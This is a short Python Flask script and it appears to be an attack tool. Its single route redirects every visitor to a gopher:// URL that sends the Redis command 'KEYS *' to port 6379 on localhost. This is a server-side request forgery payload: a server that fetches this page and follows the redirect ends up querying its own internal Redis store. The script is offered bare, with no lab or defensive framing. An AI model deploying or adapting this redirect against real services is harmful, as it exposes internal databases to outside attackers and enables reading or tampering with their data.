from flask import Flask, redirect

app = Flask(__name__)

index = 0

@app.route('/')
def old_route():

    # Redirect to a different URL
    return redirect("gopher://127.0.0.1:6379/_KEYS%20*", code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

